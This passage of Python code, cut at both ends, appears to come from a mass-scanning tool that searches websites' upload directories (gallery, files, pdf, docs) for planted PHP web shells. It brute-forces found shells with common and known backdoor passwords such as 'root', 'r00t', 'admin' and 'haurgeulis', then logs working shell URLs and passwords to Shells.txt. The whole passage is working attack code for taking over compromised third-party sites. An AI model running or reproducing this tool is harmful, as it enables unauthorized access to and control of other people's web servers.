																				print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH8_O+shell+'.php'+'#123123')
																			else :
																				p123321 = requests.post(SH8_O+shell+'.php',data=password_123321,timeout=15).content
																				if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																					print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH8_O+shell+'.php'+'#123321')
																				else :
																					p123456789 = requests.post(SH8_O+shell+'.php',data=password_123456789,timeout=15).content
																					if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																						print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH8_O+shell+'.php'+'#123456789')
																					else :
																						p1234567890 = requests.post(SH8_O+shell+'.php',data=password_1234567890,timeout=15).content
																						if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																							print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH8_O+shell+'.php'+'#1234567890')
																						else :
																							phaurgeulis = requests.post(SH8_O+shell+'.php',data=password_haurgeulis,timeout=15).content
																							if 'Andela1C3' in phaurgeulis  :
																								print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																								with open('Shells.txt', mode='a') as d:
																									d.write(SH8_O+shell+'.php'+'#haurgeulis')
																							else :
																								print(' # '+site +' --> {}[Failed]'.format(fr))
									else :
										print(' # '+site +' --> {}[Failed]'.format(fr))
							else :
								gallery_check = requests.get(SH9_O,timeout=15).content
								if 'Index of' in gallery_check and '.php' in gallery_check :
									shells = []
									if re.findall(pattern_php,gallery_check):
										shells = re.findall(pattern_php,gallery_check)			
									for shell in shells:
										sh_check = requests.get(SH9_O+shell+'.php',timeout=15).content
										if ' type="file"' in sh_check or ' type=\'file\'' in sh_check or ' type= "file"' in sh_check or ' type= \'file\'' in sh_check or ' type = "file"' in sh_check or ' type = \'file\'' in sh_check or ' type ="file"' in sh_check or ' type =\'file\'' in sh_check or ' type=file' in sh_check or ' type =file' in sh_check or ' type= file' in sh_check or ' type = file' in sh_check or 'Upload</a> ]</li><li>[' in sh_check or 'upload</a><li><a>Sym' in sh_check :
											print(' # '+site +'/ --> {}[Vuln]'.format(fg))
											with open('Shells.txt', mode='a') as d:
												d.write(SH9_O+shell+'.php')
										elif ' name=pass' in sh_check :
											nhzgrf = requests.post(SH9_O+shell+'.php',data=password_nhzgrf,timeout=15).content
											if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
												print(' # '+site +'/ --> {}[Vuln]'.format(fg))
												with open('Shells.txt', mode='a') as d:
													d.write(SH9_O+shell+'.php'+'#nhzgrf')
											else :
												proot = requests.post(SH9_O+shell+'.php',data=password_root,timeout=15).content
												if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
													print(' # '+site +'/ --> {}[Vuln]'.format(fg))
													with open('Shells.txt', mode='a') as d:
														d.write(SH9_O+shell+'.php'+'#root')
												else :
													pr00t = requests.post(SH9_O+shell+'.php',data=password_r00t,timeout=15).content
													if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
														print(' # '+site +'/ --> {}[Vuln]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH9_O+shell+'.php'+'#r00t')
													else :
														padmin = requests.post(SH9_O+shell+'.php',data=password_admin,timeout=15).content
														if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
															print(' # '+site +'/ --> {}[Vuln]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH9_O+shell+'.php'+'#admin')
														else :
															pt00r = requests.post(SH9_O+shell+'.php',data=password_t00r,timeout=15).content
															if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH9_O+shell+'.php'+'#t00r')
															else :
																p123 = requests.post(SH9_O+shell+'.php',data=password_123,timeout=15).content
																if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																	print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH9_O+shell+'.php'+'#123')
																else :
																	p1234 = requests.post(SH9_O+shell+'.php',data=password_1234,timeout=15).content
																	if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																		print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH9_O+shell+'.php'+'#1234')
																	else :
																		p12345 = requests.post(SH9_O+shell+'.php',data=password_12345,timeout=15).content
																		if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																			print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH9_O+shell+'.php'+'#12345')
																		else :
																			p123456 = requests.post(SH9_O+shell+'.php',data=password_123456,timeout=15).content
																			if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																				print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH9_O+shell+'.php'+'#123456')
																			else :
																				p123123 = requests.post(SH9_O+shell+'.php',data=password_123123,timeout=15).content
																				if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																					print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH9_O+shell+'.php'+'#123123')
																				else :
																					p123321 = requests.post(SH9_O+shell+'.php',data=password_123321,timeout=15).content
																					if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																						print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH9_O+shell+'.php'+'#123321')
																					else :
																						p123456789 = requests.post(SH9_O+shell+'.php',data=password_123456789,timeout=15).content
																						if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																							print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH9_O+shell+'.php'+'#123456789')
																						else :
																							p1234567890 = requests.post(SH9_O+shell+'.php',data=password_1234567890,timeout=15).content
																							if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																								print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																								with open('Shells.txt', mode='a') as d:
																									d.write(SH9_O+shell+'.php'+'#1234567890')
																							else :
																								phaurgeulis = requests.post(SH9_O+shell+'.php',data=password_haurgeulis,timeout=15).content
																								if 'Andela1C3' in phaurgeulis  :
																									print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																									with open('Shells.txt', mode='a') as d:
																										d.write(SH9_O+shell+'.php'+'#haurgeulis')
																								else :
																									print(' # '+site +' --> {}[Failed]'.format(fr))
										else :
											print(' # '+site +' --> {}[Failed]'.format(fr))
								else :
									files_check = requests.get(SH10_O,timeout=15).content
									if 'Index of' in files_check and '.php' in files_check :
										shells = []
										if re.findall(pattern_php,files_check):
											shells = re.findall(pattern_php,files_check)			
										for shell in shells:
											sh_check = requests.get(SH10_O+shell+'.php',timeout=15).content
											if ' type="file"' in sh_check or ' type=\'file\'' in sh_check or ' type= "file"' in sh_check or ' type= \'file\'' in sh_check or ' type = "file"' in sh_check or ' type = \'file\'' in sh_check or ' type ="file"' in sh_check or ' type =\'file\'' in sh_check or ' type=file' in sh_check or ' type =file' in sh_check or ' type= file' in sh_check or ' type = file' in sh_check or 'Upload</a> ]</li><li>[' in sh_check or 'upload</a><li><a>Sym' in sh_check :
												print(' # '+site +'/ --> {}[Vuln]'.format(fg))
												with open('Shells.txt', mode='a') as d:
													d.write(SH10_O+shell+'.php')
											elif ' name=pass' in sh_check :
												nhzgrf = requests.post(SH10_O+shell+'.php',data=password_nhzgrf,timeout=15).content
												if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
													print(' # '+site +'/ --> {}[Vuln]'.format(fg))
													with open('Shells.txt', mode='a') as d:
														d.write(SH10_O+shell+'.php'+'#nhzgrf')
												else :
													proot = requests.post(SH10_O+shell+'.php',data=password_root,timeout=15).content
													if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
														print(' # '+site +'/ --> {}[Vuln]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH10_O+shell+'.php'+'#root')
													else :
														pr00t = requests.post(SH10_O+shell+'.php',data=password_r00t,timeout=15).content
														if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
															print(' # '+site +'/ --> {}[Vuln]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH10_O+shell+'.php'+'#r00t')
														else :
															padmin = requests.post(SH10_O+shell+'.php',data=password_admin,timeout=15).content
															if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
																print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH10_O+shell+'.php'+'#admin')
															else :
																pt00r = requests.post(SH10_O+shell+'.php',data=password_t00r,timeout=15).content
																if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																	print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH10_O+shell+'.php'+'#t00r')
																else :
																	p123 = requests.post(SH10_O+shell+'.php',data=password_123,timeout=15).content
																	if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																		print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH10_O+shell+'.php'+'#123')
																	else :
																		p1234 = requests.post(SH10_O+shell+'.php',data=password_1234,timeout=15).content
																		if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																			print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH10_O+shell+'.php'+'#1234')
																		else :
																			p12345 = requests.post(SH10_O+shell+'.php',data=password_12345,timeout=15).content
																			if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																				print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH10_O+shell+'.php'+'#12345')
																			else :
																				p123456 = requests.post(SH10_O+shell+'.php',data=password_123456,timeout=15).content
																				if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																					print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH10_O+shell+'.php'+'#123456')
																				else :
																					p123123 = requests.post(SH10_O+shell+'.php',data=password_123123,timeout=15).content
																					if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																						print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH10_O+shell+'.php'+'#123123')
																					else :
																						p123321 = requests.post(SH10_O+shell+'.php',data=password_123321,timeout=15).content
																						if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																							print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH10_O+shell+'.php'+'#123321')
																						else :
																							p123456789 = requests.post(SH10_O+shell+'.php',data=password_123456789,timeout=15).content
																							if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																								print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																								with open('Shells.txt', mode='a') as d:
																									d.write(SH10_O+shell+'.php'+'#123456789')
																							else :
																								p1234567890 = requests.post(SH10_O+shell+'.php',data=password_1234567890,timeout=15).content
																								if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																									print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																									with open('Shells.txt', mode='a') as d:
																										d.write(SH10_O+shell+'.php'+'#1234567890')
																								else :
																									phaurgeulis = requests.post(SH10_O+shell+'.php',data=password_haurgeulis,timeout=15).content
																									if 'Andela1C3' in phaurgeulis  :
																										print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																										with open('Shells.txt', mode='a') as d:
																											d.write(SH10_O+shell+'.php'+'#haurgeulis')
																									else :
																										print(' # '+site +' --> {}[Failed]'.format(fr))
											else :
												print(' # '+site +' --> {}[Failed]'.format(fr))
									else :
										pdf_check = requests.get(SH11_O,timeout=15).content
										if 'Index of' in pdf_check and '.php' in pdf_check :
											shells = []
											if re.findall(pattern_php,pdf_check):
												shells = re.findall(pattern_php,pdf_check)			
											for shell in shells:
												sh_check = requests.get(SH11_O+shell+'.php',timeout=15).content
												if ' type="file"' in sh_check or ' type=\'file\'' in sh_check or ' type= "file"' in sh_check or ' type= \'file\'' in sh_check or ' type = "file"' in sh_check or ' type = \'file\'' in sh_check or ' type ="file"' in sh_check or ' type =\'file\'' in sh_check or ' type=file' in sh_check or ' type =file' in sh_check or ' type= file' in sh_check or ' type = file' in sh_check or 'Upload</a> ]</li><li>[' in sh_check or 'upload</a><li><a>Sym' in sh_check :
													print(' # '+site +'/ --> {}[Vuln]'.format(fg))
													with open('Shells.txt', mode='a') as d:
														d.write(SH11_O+shell+'.php')
												elif ' name=pass' in sh_check :
													nhzgrf = requests.post(SH11_O+shell+'.php',data=password_nhzgrf,timeout=15).content
													if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
														print(' # '+site +'/ --> {}[Vuln]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH11_O+shell+'.php'+'#nhzgrf')
													else :
														proot = requests.post(SH11_O+shell+'.php',data=password_root,timeout=15).content
														if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
															print(' # '+site +'/ --> {}[Vuln]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH11_O+shell+'.php'+'#root')
														else :
															pr00t = requests.post(SH11_O+shell+'.php',data=password_r00t,timeout=15).content
															if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
																print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH11_O+shell+'.php'+'#r00t')
															else :
																padmin = requests.post(SH11_O+shell+'.php',data=password_admin,timeout=15).content
																if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
																	print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH11_O+shell+'.php'+'#admin')
																else :
																	pt00r = requests.post(SH11_O+shell+'.php',data=password_t00r,timeout=15).content
																	if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																		print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH11_O+shell+'.php'+'#t00r')
																	else :
																		p123 = requests.post(SH11_O+shell+'.php',data=password_123,timeout=15).content
																		if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																			print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH11_O+shell+'.php'+'#123')
																		else :
																			p1234 = requests.post(SH11_O+shell+'.php',data=password_1234,timeout=15).content
																			if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																				print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH11_O+shell+'.php'+'#1234')
																			else :
																				p12345 = requests.post(SH11_O+shell+'.php',data=password_12345,timeout=15).content
																				if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																					print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH11_O+shell+'.php'+'#12345')
																				else :
																					p123456 = requests.post(SH11_O+shell+'.php',data=password_123456,timeout=15).content
																					if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																						print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH11_O+shell+'.php'+'#123456')
																					else :
																						p123123 = requests.post(SH11_O+shell+'.php',data=password_123123,timeout=15).content
																						if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																							print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH11_O+shell+'.php'+'#123123')
																						else :
																							p123321 = requests.post(SH11_O+shell+'.php',data=password_123321,timeout=15).content
																							if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																								print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																								with open('Shells.txt', mode='a') as d:
																									d.write(SH11_O+shell+'.php'+'#123321')
																							else :
																								p123456789 = requests.post(SH11_O+shell+'.php',data=password_123456789,timeout=15).content
																								if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																									print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																									with open('Shells.txt', mode='a') as d:
																										d.write(SH11_O+shell+'.php'+'#123456789')
																								else :
																									p1234567890 = requests.post(SH11_O+shell+'.php',data=password_1234567890,timeout=15).content
																									if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																										print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																										with open('Shells.txt', mode='a') as d:
																											d.write(SH11_O+shell+'.php'+'#1234567890')
																									else :
																										phaurgeulis = requests.post(SH11_O+shell+'.php',data=password_haurgeulis,timeout=15).content
																										if 'Andela1C3' in phaurgeulis  :
																											print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																											with open('Shells.txt', mode='a') as d:
																												d.write(SH11_O+shell+'.php'+'#haurgeulis')
																										else :
																											print(' # '+site +' --> {}[Failed]'.format(fr))
												else :
													print(' # '+site +' --> {}[Failed]'.format(fr))
										else :
											docs_check = requests.get(SH12_O,timeout=15).content
											if 'Index of' in docs_check and '.php' in docs_check :
												shells = []
												if re.findall(pattern_php,docs_check):
													shells = re.findall(pattern_php,docs_check)			
												for shell in shells:
													sh_check = requests.get(SH12_O+shell+'.php',timeout=15).content
